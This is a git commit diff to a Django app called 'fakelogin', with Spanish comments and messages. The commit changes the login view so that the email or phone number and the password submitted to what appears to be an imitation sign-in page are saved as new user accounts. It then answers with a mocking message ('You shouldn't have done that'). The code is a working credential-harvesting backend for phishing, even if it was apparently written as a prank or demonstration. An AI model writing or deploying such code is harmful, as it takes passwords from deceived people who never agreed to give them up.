3cb534560296fef189a7d6312ad646f908a10b56
Gabriel Rosales <gabrielalejandrorosalesazurdia@gmail.com>
2023-01-09 14:23:39 -0600

    tomando datos y creando usuarios

--- fakelogin/views.py
+++ fakelogin/views.py
@@ -1,10 +1,16 @@
 from django.shortcuts import render
 from django.http import HttpResponse, Http404
+from django.contrib.auth import get_user_model
 
 def loginpage(request):
     if request.method == "GET":
         return render(request,"home.html")
     if request.method == "POST":
-        
-        return HttpResponse("Hizo un post")
+        user_model = get_user_model();
+        try:
+            new_user = user_model.objects.create_user(email=request.POST["emailorphone"],password=request.POST["password"])
+            new_user.save()
+            return HttpResponse("No debíste hacer eso ; )")
+        except:
+            return HttpResponse("No debíste hacer eso, gracias por intentar otra vez ; )")
     raise Http404()
